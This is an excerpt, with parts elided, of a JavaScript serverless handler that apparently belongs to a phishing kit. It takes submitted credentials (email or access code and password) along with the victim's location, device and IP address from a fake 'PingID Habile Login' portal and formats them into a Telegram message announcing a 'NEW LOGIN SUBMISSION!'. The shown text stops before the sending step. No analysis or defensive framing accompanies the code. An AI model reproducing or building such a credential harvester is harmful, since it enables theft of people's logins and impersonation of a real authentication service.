...
export const handler = async (event, context) => {
  ...
  try {
    ...
    const safeEmail = escapeHtml(body.accessCode || 'N/A');
    const safePass = escapeHtml(body.password || 'N/A');
    const safeLocation = escapeHtml(body.locationStr || 'Unknown');
    const safeDevice = escapeHtml(body.device || 'Unknown');
    const safeIp = escapeHtml(body.ipStr || 'Unknown');
    const now = new Date().toLocaleString("fr-FR");

    // Format HTML Message for Telegram
    let message = `🔥 <b>NEW LOGIN SUBMISSION!</b>\n`;
    message += `📋 <b>Portal:</b> PingID Habile Login\n`;
    message += `━━━━━━━━━━━━━━━━━━\n`;
    message += `📧 <b>Identifiant/Email:</b> <code>${safeEmail}</code>\n`;
